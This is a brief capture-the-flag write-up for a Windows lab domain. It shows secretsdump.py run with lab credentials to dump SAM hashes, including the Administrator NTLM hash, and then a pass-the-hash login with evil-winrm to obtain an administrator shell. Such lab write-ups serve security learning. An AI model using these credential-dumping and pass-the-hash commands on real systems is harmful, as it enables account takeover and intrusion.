There's a few ways to priv esc here

`whoami /priv` shows that a-whitehat has every privilege possible so we COULD use juicy potato.

Because we have creds, `secretsdump.py` will also dump hashes for us.

` python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.127.164`

This will give us the NTLM hash for `Administrator`

```bash
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

We can either crack the hash or use a Pass The Hash attack.

We can pass the hash with `evil-winrm`
`evil-winrm -i 10.10.127.164 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"`

This gives us root. We can grab the flag at `c:\users\administrator\desktop`



